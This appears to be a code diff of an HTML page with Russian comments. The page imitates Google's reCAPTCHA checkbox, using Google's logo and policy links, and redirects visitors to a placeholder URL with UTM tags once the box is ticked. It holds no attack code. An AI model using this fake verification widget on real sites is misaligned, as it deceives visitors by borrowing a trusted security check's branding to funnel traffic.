@@ -16,7 +16,8 @@
         }
         .container {
             display: flex;
-            align-items: center;
+            flex-direction: column;
+            align-items: flex-start;
             gap: 10px;
         }
         .captcha-container {
@@ -51,7 +52,6 @@
             width: 20px;
             height: 20px;
             margin-bottom: 5px;
-            background-color: #ccc; /* Заглушка для битого изображения */
         }
         .captcha-brand {
             font-size: 12px;
@@ -87,14 +87,13 @@
 </head>
 <body>
     <div class="container">
-        <button class="submit-button" onclick="verify()">Отправить</button>
         <div class="captcha-container">
             <div class="captcha-left">
-                <input type="checkbox" id="captcha" class="captcha-checkbox">
+                <input type="checkbox" id="captcha" class="captcha-checkbox" onchange="verify()">
                 <span class="captcha-text">Я не робот</span>
             </div>
             <div class="captcha-right">
-                <div class="captcha-logo"></div> <!-- Заглушка для логотипа -->
+                <img src="https://www.melett.ru/wp-content/uploads/2023/09/recaptcha-logo-icon.png" class="captcha-logo" alt="reCAPTCHA">
                 <span class="captcha-brand">reCAPTCHA</span>
                 <div class="captcha-links">
                     <a href="https://policies.google.com/privacy" target="_blank">Privacy</a> - 
@@ -102,18 +101,20 @@
                 </div>
             </div>
         </div>
+        <button class="submit-button" onclick="verify()">Отправить</button>
     </div>
     <div class="error" id="error">Пожалуйста, подтвердите, что вы не робот.</div>
 
     <script>
+        // Ссылка для редиректа
+        const redirectUrl = 'https://example.com?utm_source=yourdomain&utm_medium=link'; // Замените на ваш URL с параметрами
+
         function verify() {
             const checkbox = document.getElementById('captcha');
             const error = document.getElementById('error');
             if (checkbox.checked) {
                 error.style.display = 'none';
-                const targetUrl = 'https://example.com'; // Замените на ваш URL
-                const utmParams = '?utm_source=yourdomain&utm_medium=link'; // Настройте UTM-метки
-                window.location.href = targetUrl + utmParams;
+                window.location.href = redirectUrl; // Редирект сразу после установки галочки
             } else {
                 error.style.display = 'block';
             }
